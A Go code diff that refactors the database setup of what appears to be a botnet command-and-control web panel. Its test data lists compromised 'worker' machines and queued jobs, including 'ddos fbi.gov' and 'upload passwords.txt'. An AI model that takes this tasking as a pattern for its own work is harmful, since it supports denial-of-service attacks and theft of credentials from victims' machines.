@@ -1,6 +1,7 @@
-package models
+package controllers
 
 import (
+	"WebAppGo/api/models"
 	"WebAppGo/api/types"
 	"database/sql"
 	_ "github.com/go-sql-driver/mysql"
@@ -15,26 +16,26 @@ func SetupDatabase(dbPath string) error {
 	if err != nil {
 		return err
 	}
-	if _, err = db.Exec(WorkerSchema); err != nil {
+	if _, err = db.Exec(models.WorkerSchema); err != nil {
 		return err
 	}
-	if _, err = db.Exec(JobSchema); err != nil {
+	if _, err = db.Exec(models.JobSchema); err != nil {
 		return err
 	}
-	if _, err = db.Exec(JobReportSchema); err != nil {
+	if _, err = db.Exec(models.JobReportSchema); err != nil {
 		return err
 	}
-	if _, err = db.Exec(HardwareInfoSchema); err != nil {
+	if _, err = db.Exec(models.HardwareInfoSchema); err != nil {
 		return err
 	}
-	if _, err = db.Exec(UploadSchema); err != nil {
+	if _, err = db.Exec(models.UploadSchema); err != nil {
 		return err
 	}
 	return nil
 }
 
 func AddTestData() {
-	w1 := Worker{
+	w1 := models.Worker{
 		Id:       "C1vHa4fB9kukvA6ILps0kQ",
 		Hostname: "Predator",
 		Os:       "Windows 10",
@@ -44,7 +45,7 @@ func AddTestData() {
 		Boost:    types.NullBool{Bool: true, Valid: true},
 		LastSeen: time.Now(),
 	}
-	w2 := Worker{
+	w2 := models.Worker{
 		Id:       "K8_RNoHLL0S-UELe3WqhSw",
 		Hostname: "Helios 300",
 		Os:       "Windows 7",
@@ -54,7 +55,7 @@ func AddTestData() {
 		Boost:    types.NullBool{Bool: false, Valid: true},
 		LastSeen: time.Now(),
 	}
-	w3 := Worker{
+	w3 := models.Worker{
 		Id:       "8GYEaE8G5E2oZtVyxY8nxg",
 		Hostname: "Acer Nexus",
 		Os:       "Windows 8",
@@ -64,7 +65,7 @@ func AddTestData() {
 		Boost:    types.NullBool{Bool: false, Valid: true},
 		LastSeen: time.Now(),
 	}
-	w4 := Worker{
+	w4 := models.Worker{
 		Id:       "cxi5YsNdk020NNMYhqZ78g",
 		Hostname: "KNIGHT",
 		Os:       "Windows 10",
@@ -80,25 +81,25 @@ func AddTestData() {
 	db.Exec(insertQuery1, w3.Id, w3.Hostname, w3.Country, w3.IpAddr, w3.Os, w3.IsAdmin, w3.Boost, w3.LastSeen)
 	db.Exec(insertQuery1, w4.Id, w4.Hostname, w4.Country, w4.IpAddr, w4.Os, w4.IsAdmin, w4.Boost, w4.LastSeen)
 
-	hw1 := HardwareInfo{
+	hw1 := models.HardwareInfo{
 		Gpu:      "NVIDIA GeForce GTX 1060",
 		Cpu:      "Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz 2.21 GHz",
 		Ram:      "8,0 GB",
 		WorkerId: w1.Id,
 	}
-	hw2 := HardwareInfo{
+	hw2 := models.HardwareInfo{
 		Gpu:      "AMD Radeon RX 5600 XT",
 		Cpu:      "Intel Core i9-10900K Processor",
 		Ram:      "4,0 GB",
 		WorkerId: w2.Id,
 	}
-	hw3 := HardwareInfo{
+	hw3 := models.HardwareInfo{
 		Gpu:      "Nvidia GeForce RTX 3080",
 		Cpu:      "AMD Ryzen 9 5900X",
 		Ram:      "12,0 GB",
 		WorkerId: w3.Id,
 	}
-	hw4 := HardwareInfo{
+	hw4 := models.HardwareInfo{
 		Gpu:      "Intel Core i9-10980XE Extreme Edition Processor",
 		Cpu:      "Intel(R) UHD Graphics 630",
 		Ram:      "32,0 GB",
@@ -110,13 +111,13 @@ func AddTestData() {
 	db.Exec(insertQuery2, hw3.Gpu, hw3.Cpu, hw3.Ram, hw3.WorkerId)
 	db.Exec(insertQuery2, hw4.Gpu, hw4.Cpu, hw4.Ram, hw4.WorkerId)
 
-	j1 := Job{
+	j1 := models.Job{
 		Todo:     "ddos fbi.gov",
 		IsDone:   types.NullBool{Bool: false, Valid: true},
 		Created:  time.Now(),
 		WorkerId: w1.Id,
 	}
-	j2 := Job{
+	j2 := models.Job{
 		Todo:     "upload passwords.txt",
 		IsDone:   types.NullBool{Bool: true, Valid: true},
 		Created:  time.Now(),
